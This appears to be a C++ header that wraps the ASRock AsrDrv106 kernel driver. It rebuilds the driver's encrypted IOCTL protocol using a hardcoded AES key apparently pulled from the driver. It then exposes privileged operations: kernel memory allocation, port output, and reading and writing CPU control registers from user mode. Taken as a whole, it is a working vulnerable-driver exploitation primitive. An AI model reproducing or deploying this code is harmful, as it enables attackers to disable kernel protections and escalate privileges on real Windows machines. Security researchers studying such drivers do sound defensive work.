#pragma once

#include <Windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

#include "data_stream.hpp"
#include "driver.hpp"

class asr_drv : public driver
{
	enum class ctl_code : std::uint32_t
	{
		enc_req = 0x22EC00,
		alloc_krnl_mem = 0x22E880,
		free_krnl_mem = 0x22E884,
		outbyte = 0x22E888,
		read_tsc = 0x22E864,
		read_pmc = 0x22E868,
		read_cr = 0x22E86C,
		write_cr = 0x22E870,
	};
private:
	
public:
	asr_drv()
		: driver{ "AsrDrv106" }
	{
	}

	void encrypt_ioctl(ctl_code code, void* io_ctl_request, std::uint32_t request_size, void** encrypted_request, std::uint32_t& encrypted_request_size)
	{
		data_stream to_encrypt{ request_size + 8 };
		to_encrypt.write<uintptr_t>((uintptr_t)code);
		to_encrypt.write_buffer(io_ctl_request, request_size);

		data_stream request{ 0x2C };
		request.seek(2);
		//Write the iv length
		request.write<int>(21);
		//Write the iv itself
		request.set(0x69, 21);
		//Write partial key
		request.set(0x65, 16);
		//Seek to an aligned number
		request.seek(1, true);

		//Create the secret key pulled from the driver and write part of the key
		std::string secret{ "C110DD4FE9434147B92A5A1E3FDBF29A" };
		secret.replace(13, 16, "eeeeeeeeeeeeeeee");

		//Open a handle to the AES algo
		BCRYPT_ALG_HANDLE h_aes = nullptr;
		if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&h_aes, L"AES", nullptr, 0)))
		{
			std::cout << "BCryptOpenAlgorithmProvider failed " << std::hex << GetLastError();
			request.free();
			return;
		}

		//Create our key to encrypt the data with
		BCRYPT_KEY_HANDLE h_key = nullptr;
		if (!NT_SUCCESS(BCryptGenerateSymmetricKey(h_aes, &h_key, nullptr, 0, (PUCHAR)secret.c_str(), 32, 0)))
		{
			std::cout << "BCryptGenerateSymmetricKey failed " << std::hex << GetLastError();
			request.free();
			return;
		}
		
		ULONG encrypted_data_size{ 0 };
		if (!NT_SUCCESS(BCryptEncrypt(h_key, (PUCHAR)to_encrypt.start(), to_encrypt.get_size(), nullptr, (PUCHAR)request.view(6), 21, nullptr, 0, &encrypted_data_size, BCRYPT_PAD_NONE)))
		{
			std::cout << "BCryptEncrypt failed " << std::hex << GetLastError();
			request.free();
			return;
		}
		
		//Update buffer to create room for encrypted data
		request.extend(encrypted_data_size + 6);

		if (!NT_SUCCESS(BCryptEncrypt(h_key, (PUCHAR)to_encrypt.start(), to_encrypt.get_size(), nullptr, (PUCHAR)request.view(6), 21, (PUCHAR)request.current(), encrypted_data_size, &encrypted_data_size, BCRYPT_PAD_NONE)))
		{
			std::cout << "BCryptEncrypt failed " << std::hex << GetLastError();
			request.free();
			return;
		}

		to_encrypt.free();

		//Save position before we overwrite the cursor
		std::uint32_t pos = request.tell();
		//Seek to the IV and re-write it as the encryption process overwrote the buffer
		request.seek(6);
		request.set(0x69, 21);
		//Restore cursor position
		request.seek(pos);

		//Seek past the encrypted_data_size
		request.seek(encrypted_data_size, true);
		//Write size 
		request.write<int>(encrypted_data_size);

		encrypted_request_size = request.get_size();
		*encrypted_request = request.start();
	}

	void send_request(ctl_code code, void* request, std::uint32_t request_size, void* data_out, std::uint32_t data_out_size)
	{
		void* encrypted_request = nullptr;
		std::uint32_t encrypted_request_size = 0;
		encrypt_ioctl(code, request, request_size, &encrypted_request, encrypted_request_size);
		io_control((uint32_t)ctl_code::enc_req, encrypted_request, encrypted_request_size, data_out, data_out_size);
	}

	std::uint64_t read_cr(std::uint32_t cr_number)
	{
		struct
		{
			std::uint64_t cr_number;
			std::uint64_t cr_value;
		} request;
		request.cr_number = cr_number;

		send_request(ctl_code::read_cr, &request, sizeof request, &request, sizeof request);

		return request.cr_value;
	}

	void write_cr(std::uint32_t cr_number, std::uint64_t value)
	{
		struct
		{
			std::uint64_t cr_number;
			std::uint64_t cr_value;
		} request;
		request.cr_number = cr_number;
		request.cr_value = value;

		send_request(ctl_code::write_cr, &request, sizeof request, &request, 0);
	}

};